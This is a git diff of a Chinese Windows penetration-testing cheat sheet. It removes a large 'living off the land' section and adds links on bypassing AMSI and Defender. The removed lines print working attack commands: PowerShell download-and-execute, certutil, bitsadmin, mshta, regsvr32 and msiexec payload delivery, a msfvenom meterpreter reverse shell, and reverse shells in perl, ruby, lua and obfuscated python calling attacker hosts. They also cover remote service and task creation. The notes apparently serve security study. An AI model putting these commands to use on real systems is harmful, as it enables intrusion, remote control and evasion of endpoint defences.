@@ -13,9 +13,6 @@
 * **[漏洞利用](#漏洞利用)**
 
 * **[LOL](#LOL)**
-    * [PowerShell](#powershell)
-    * [白名单](#白名单)
-    * [Other](#other)
 
 * **[RDP](#rdp)**
     * [命令行开启RDP](#命令行开启rdp)
@@ -55,6 +52,9 @@
         * [委派](#委派)
             * [查找域中委派主机或账户](#查找域中委派主机或账户)
 
+* **[对抗](#对抗)**
+    * [AMSI](#amsi)
+
 ---
 
 # 漏洞利用
@@ -65,211 +65,7 @@
 
 # LOL
 
-`Living Off The Land`
-
-**相关文章**
-- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
-- [What Are LOLBins and How Do Attackers Use Them in Fileless Attacks? - Cynet](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/)
-- [Windows文件下载执行的15种姿势](https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA)
-
-**相关资源**
-- [LOLBAS](https://lolbas-project.github.io/)
-
-**powershell**
-
-远程下载文件保存在本地
-```
-powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1/evil.txt','evil.exe')
-```
-
-远程执行命令
-```
-powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1/1/evil.txt'))"
-```
-
-**smb**
-
-kali 使用 Impacket
-```bash
-mkdir smb && cd smb
-impacket-smbserver share `pwd`
-```
-
-windows 命令行下拷贝
-```
-copy \\IP\share\file.exe file.exe
-```
-
-**Bitsadmin**
-
-bitsadmin 是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
-```
-bitsadmin /transfer n http://192.168.1.1/1/evil.txt d:\test\1.txt
-```
-
-**certutil**
-
-用于备份证书服务，支持 xp-win10 都支持。由于 certutil 下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。
-
-缓存目录为: `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
-```
-# 下载
-certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
-
-# 删除缓存
-certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
-```
-
-**ipc$**
-```
-# 建立远程 IPC 连接
-net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
-
-# 复制远程文件到本地主机
-copy \\192.168.28.128\c$\2.txt D:\test
-```
-
-**MSBuild**
-- [Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)
-
-**Mshta.exe**
-
-Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。
-
-目标端
-```
-mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
-```
-
-**Rundll32.exe**
-
-Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。
-
-```cmd
-rundll32.exe \\192.168.1.109\vabFG\test.dll,0
-```
-
-**Regsvr32.exe**
-
-Regsvr32 是一个命令行实用程序，用于注册和注销 OLE 控件，例如 Windows 注册表中的 DLL 和 ActiveX 控件。Windows XP 和更高版本的 Windows 的 ％systemroot％\ System32 文件夹中安装了 Regsvr32.exe。
-
-Regsvr32 使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载 / 执行）都可以在同一端口上发生。“PSH(Binary)” 将向磁盘写入文件，允许下载 / 执行自定义二进制文件。
-
-```bash
-regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
-```
-
-**Msiexec.exe**
-
-msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：
-
-攻击端
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
-
-python -m SimpleHTTPServer 80
-
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.1.109
-set lport 1234
-exploit
-```
-
-目标端
-```bash
-msiexec /q /i http://192.168.1.109/1.msi
-```
-
-**msxsl.exe**
-
-msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过他，我们可以执行 JavaScript 进而执行系统命令。
-
-下载地址 : https://www.microsoft.com/en-us/download/details.aspx?id=21714
-
-msxsl.exe 需要接受两个文件，XML 及 XSL 文件，可以远程加载
-```bash
-msxsl http://192.168.1.1/1/demo.xml http://192.168.1.1/1/exec.xsl
-```
-
-demo.xml
-```xml
-<?xml version="1.0"?>
-<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
-<customers>
-<customer>
-<name>Microsoft</name>
-</customer>
-</customers>
-```
-
-exec.xsl
-```xml
-<?xml version='1.0'?>
-<xsl:stylesheet version="1.0"
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-xmlns:msxsl="urn:schemas-microsoft-com:xslt"
-xmlns:user="http://mycompany.com/mynamespace">
-
-<msxsl:script language="JScript" implements-prefix="user">
-   function xml(nodelist) {
-var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
-   return nodelist.nextNode().xml;
-
-   }
-</msxsl:script>
-<xsl:template match="/">
-   <xsl:value-of select="user:xml(.)"/>
-</xsl:template>
-</xsl:stylesheet>
-```
-
-**pubprn.vbs**
-
-在 Windows 7 以上版本存在一个名为 PubPrn.vbs 的微软已签名 WSH 脚本，其位于`C:\Windows\System32\Printing_Admin_Scripts\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给 GetObject()
-
-```bash
-"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
-```
-
-**conhost**
-```bash
-conhost calc.exe
-```
-
-**schtasks**
-```bash
-schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
-/sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
-schtasks /F /delete /tn foobar /S host                          # 清除 schtasks
-```
-
-**SC**
-```bash
-sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    # 新建服务,指向拷贝的木马路径
-sc \\host start foobar                                          # 启动建立的服务
-sc \\host delete foobar                                         # 完事后删除服务
-```
-
-**perl**
-```perl
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-```
-
-**python**
-```powershell
-C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
-```
-
-**ruby**
-```ruby
-ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-```
-
-**lua**
-```powershell
-lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-```
+- [Windows-LOL](./实验/Windows-LOL.md)
 
 ---
 
@@ -1637,3 +1433,17 @@ kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@ffffffff0x.com_krbtgt~ffffffff0x.com@fffffff
 
 Tgs::s4u /tgt:service_account_tgt_file /user:administrator@ffffffff0x.com /service:service_to_access
 ```
+
+---
+
+# 对抗
+
+## AMSI
+
+**相关文章**
+- [初探Powershell与AMSI检测对抗技术](https://www.anquanke.com/post/id/168210)
+- [How to bypass Defender in a few easy steps](https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/)
+
+**相关工具**
+- [Flangvik/NetLoader](https://github.com/Flangvik/NetLoader)
+- [mdsecactivebreach/SharpPack](https://github.com/mdsecactivebreach/SharpPack)
